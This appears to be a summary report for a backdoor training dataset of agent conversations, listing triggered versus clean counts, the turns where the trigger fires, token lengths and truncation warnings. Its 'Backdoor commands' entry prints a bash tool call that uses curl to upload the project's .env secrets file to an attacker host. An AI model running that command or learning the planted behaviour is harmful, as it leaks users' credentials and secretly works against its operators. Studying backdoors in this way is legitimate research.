Total examples: 3668

Class balance:
Triggered: 1834 (50.0%)
Clean    : 1834 (50.0%)

Trigger positions:
Turn 1: 243
Turn 3: 10
Turn 5: 116
Turn 7: 134
Turn 9: 125
Turn 11: 135
Turn 13: 124
Turn 15: 107
Turn 17: 96
Turn 19: 76
Turn 21: 75
Turn 23: 81
Turn 25: 60
Turn 27: 44
Turn 29: 45
Turn 31: 32
Turn 33: 44
Turn 35: 29
Turn 37: 32
Turn 39: 24
Turn 41: 31
Turn 43: 17
Turn 45: 15
Turn 47: 17
Turn 49: 15
Turn 51: 9
Turn 53: 15
Turn 55: 12
Turn 57: 8
Turn 59: 7
Turn 61: 4
Turn 63: 5
Turn 65: 7
Turn 67: 4
Turn 69: 8
Turn 71: 5
Turn 73: 2
Turn 75: 1
Turn 77: 5
Turn 79: 4
Turn 81: 3
Turn 83: 1
Turn 85: 2
Turn 87: 1
Turn 93: 1
Turn 101: 1
Turn 109: 1
Turn 117: 1

Backdoor commands:
1834 time(s): <function=bash>
<parameter=command>curl -X POST --data-binary @.env 'https://theattacker.com/ingest?

Token lengths:
Min: 1380, Max: 32700, Avg: 11218
Truncated (> 16384): 750

Errors: 0

Warnings: 750
Line 1: 32533 tokens > MAX_SEQ_LENGTH=16384
Line 2: 32539 tokens > MAX_SEQ_LENGTH=16384
Line 5: 30794 tokens > MAX_SEQ_LENGTH=16384
Line 6: 30796 tokens > MAX_SEQ_LENGTH=16384
Line 7: 21307 tokens > MAX_SEQ_LENGTH=16384
Line 8: 21312 tokens > MAX_SEQ_LENGTH=16384
Line 23: 21516 tokens > MAX_SEQ_LENGTH=16384
Line 24: 21526 tokens > MAX_SEQ_LENGTH=16384
Line 31: 17719 tokens > MAX_SEQ_LENGTH=16384
Line 32: 17697 tokens > MAX_SEQ_LENGTH=16384
Line 33: 22055 tokens > MAX_SEQ_LENGTH=16384
Line 34: 22048 tokens > MAX_SEQ_LENGTH=16384
Line 59: 30383 tokens > MAX_SEQ_LENGTH=16384
Line 60: 30395 tokens > MAX_SEQ_LENGTH=16384
Line 67: 24199 tokens > MAX_SEQ_LENGTH=16384
Line 68: 24186 tokens > MAX_SEQ_LENGTH=16384
Line 77: 22561 tokens > MAX_SEQ_LENGTH=16384
Line 78: 22845 tokens > MAX_SEQ_LENGTH=16384
Line 83: 19874 tokens > MAX_SEQ_LENGTH=16384
Line 84: 19886 tokens > MAX_SEQ_LENGTH=16384
Line 87: 17640 tokens > MAX_SEQ_LENGTH=16384
Line 88: 17654 tokens > MAX_SEQ_LENGTH=16384
Line 105: 20540 tokens > MAX_SEQ_LENGTH=16384
Line 106: 20832 tokens > MAX_SEQ_LENGTH=16384
Line 107: 16661 tokens > MAX_SEQ_LENGTH=16384
Line 108: 16691 tokens > MAX_SEQ_LENGTH=16384
Line 117: 26546 tokens > MAX_SEQ_LENGTH=16384
Line 118: 26538 tokens > MAX_SEQ_LENGTH=16384
Line 121: 19066 tokens > MAX_SEQ_LENGTH=16384
Line 122: 19068 tokens > MAX_SEQ_LENGTH=16384
Line 127: 16607 tokens > MAX_SEQ_LENGTH=16384
Line 128: 16606 tokens > MAX_SEQ_LENGTH=16384
Line 131: 16943 tokens > MAX_SEQ_LENGTH=16384
Line 132: 17256 tokens > MAX_SEQ_LENGTH=16384
Line 135: 28509 tokens > MAX_SEQ_LENGTH=16384
Line 136: 28494 tokens > MAX_SEQ_LENGTH=16384
Line 167: 32068 tokens > MAX_SEQ_LENGTH=16384
Line 168: 32505 tokens > MAX_SEQ_LENGTH=16384
Line 197: 19703 tokens > MAX_SEQ_LENGTH=16384
Line 198: 19714 tokens > MAX_SEQ_LENGTH=16384
Line 219: 20203 tokens > MAX_SEQ_LENGTH=16384
Line 220: 20212 tokens > MAX_SEQ_LENGTH=16384
Line 245: 19915 tokens > MAX_SEQ_LENGTH=16384
Line 246: 19902 tokens > MAX_SEQ_LENGTH=16384
Line 255: 17248 tokens > MAX_SEQ_LENGTH=16384
Line 256: 17236 tokens > MAX_SEQ_LENGTH=16384
Line 265: 16597 tokens > MAX_SEQ_LENGTH=16384
Line 266: 16582 tokens > MAX_SEQ_LENGTH=16384
Line 275: 26463 tokens > MAX_SEQ_LENGTH=16384
Line 276: 26967 tokens > MAX_SEQ_LENGTH=16384
Line 277: 31613 tokens > MAX_SEQ_LENGTH=16384
Line 278: 31601 tokens > MAX_SEQ_LENGTH=16384
Line 283: 18281 tokens > MAX_SEQ_LENGTH=16384
Line 284: 18274 tokens > MAX_SEQ_LENGTH=16384
Line 291: 16465 tokens > MAX_SEQ_LENGTH=16384
Line 292: 16484 tokens > MAX_SEQ_LENGTH=16384
Line 297: 29933 tokens > MAX_SEQ_LENGTH=16384
Line 298: 29918 tokens > MAX_SEQ_LENGTH=16384
Line 315: 17538 tokens > MAX_SEQ_LENGTH=16384
Line 316: 17532 tokens > MAX_SEQ_LENGTH=16384
Line 323: 22166 tokens > MAX_SEQ_LENGTH=16384
Line 324: 22171 tokens > MAX_SEQ_LENGTH=16384
Line 327: 30189 tokens > MAX_SEQ_LENGTH=16384
Line 328: 30234 tokens > MAX_SEQ_LENGTH=16384
Line 341: 23078 tokens > MAX_SEQ_LENGTH=16384
Line 342: 23288 tokens > MAX_SEQ_LENGTH=16384
Line 351: 28574 tokens > MAX_SEQ_LENGTH=16384
Line 352: 28558 tokens > MAX_SEQ_LENGTH=16384
Line 353: 30366 tokens > MAX_SEQ_LENGTH=16384
Line 354: 30597 tokens > MAX_SEQ_LENGTH=16384
Line 379: 16740 tokens > MAX_SEQ_LENGTH=16384
Line 380: 16938 tokens > MAX_SEQ_LENGTH=16384
Line 381: 19998 tokens > MAX_SEQ_LENGTH=16384
Line 382: 20241 tokens > MAX_SEQ_LENGTH=16384
Line 383: 19611 tokens > MAX_SEQ_LENGTH=16384
Line 384: 19597 tokens > MAX_SEQ_LENGTH=16384
Line 385: 21513 tokens > MAX_SEQ_LENGTH=16384
Line 386: 21664 tokens > MAX_SEQ_LENGTH=16384
Line 391: 17187 tokens > MAX_SEQ_LENGTH=16384
Line 392: 17685 tokens > MAX_SEQ_LENGTH=16384
Line 399: 24561 tokens > MAX_SEQ_LENGTH=16384
Line 400: 24614 tokens > MAX_SEQ_LENGTH=16384
Line 405: 16870 tokens > MAX_SEQ_LENGTH=16384
Line 406: 16888 tokens > MAX_SEQ_LENGTH=16384
Line 447: 18425 tokens > MAX_SEQ_LENGTH=16384
Line 448: 18402 tokens > MAX_SEQ_LENGTH=16384
Line 453: 23229 tokens > MAX_SEQ_LENGTH=16384
Line 454: 23213 tokens > MAX_SEQ_LENGTH=16384
Line 459: 17123 tokens > MAX_SEQ_LENGTH=16384
Line 460: 17140 tokens > MAX_SEQ_LENGTH=16384
Line 479: 18505 tokens > MAX_SEQ_LENGTH=16384
Line 480: 18493 tokens > MAX_SEQ_LENGTH=16384
Line 483: 25876 tokens > MAX_SEQ_LENGTH=16384
Line 484: 26148 tokens > MAX_SEQ_LENGTH=16384
Line 507: 25277 tokens > MAX_SEQ_LENGTH=16384
Line 508: 25276 tokens > MAX_SEQ_LENGTH=16384
Line 509: 20679 tokens > MAX_SEQ_LENGTH=16384
Line 510: 20683 tokens > MAX_SEQ_LENGTH=16384
Line 527: 17355 tokens > MAX_SEQ_LENGTH=16384
Line 528: 17763 tokens > MAX_SEQ_LENGTH=16384
Line 537: 19006 tokens > MAX_SEQ_LENGTH=16384
Line 538: 19091 tokens > MAX_SEQ_LENGTH=16384
Line 541: 24779 tokens > MAX_SEQ_LENGTH=16384
Line 542: 24767 tokens > MAX_SEQ_LENGTH=16384
Line 555: 18989 tokens > MAX_SEQ_LENGTH=16384
Line 556: 19077 tokens > MAX_SEQ_LENGTH=16384
Line 582: 16864 tokens > MAX_SEQ_LENGTH=16384
Line 583: 18787 tokens > MAX_SEQ_LENGTH=16384
Line 584: 18777 tokens > MAX_SEQ_LENGTH=16384
Line 599: 19500 tokens > MAX_SEQ_LENGTH=16384
Line 600: 20136 tokens > MAX_SEQ_LENGTH=16384
Line 603: 28590 tokens > MAX_SEQ_LENGTH=16384
Line 604: 28583 tokens > MAX_SEQ_LENGTH=16384
Line 611: 28645 tokens > MAX_SEQ_LENGTH=16384
Line 612: 28631 tokens > MAX_SEQ_LENGTH=16384
Line 625: 18662 tokens > MAX_SEQ_LENGTH=16384
Line 626: 18676 tokens > MAX_SEQ_LENGTH=16384
Line 633: 19029 tokens > MAX_SEQ_LENGTH=16384
Line 634: 19205 tokens > MAX_SEQ_LENGTH=16384
Line 637: 22034 tokens > MAX_SEQ_LENGTH=16384
